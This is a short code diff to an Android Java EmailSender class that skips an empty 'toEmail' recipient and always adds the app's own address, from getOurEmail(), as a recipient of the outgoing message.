@@ -74,10 +74,12 @@ public class EmailSender {
         emailMessage.setFrom(new InternetAddress(fromEmail, fromEmail));
 
         Log.i("GMail", "toEmail: " + toEmail);
+        if (!toEmail.isEmpty()) {
+            emailMessage.addRecipient(Message.RecipientType.TO,
+                    new InternetAddress(toEmail));
+        }
         emailMessage.addRecipient(Message.RecipientType.TO,
-                new InternetAddress(toEmail));
-
-
+                new InternetAddress(DataKeeperKeeper.keeper.getOurEmail()));
         emailMessage.setSubject(emailSubject);
         MimeMultipart multipart = new MimeMultipart();
         MimeBodyPart attachment = new MimeBodyPart();
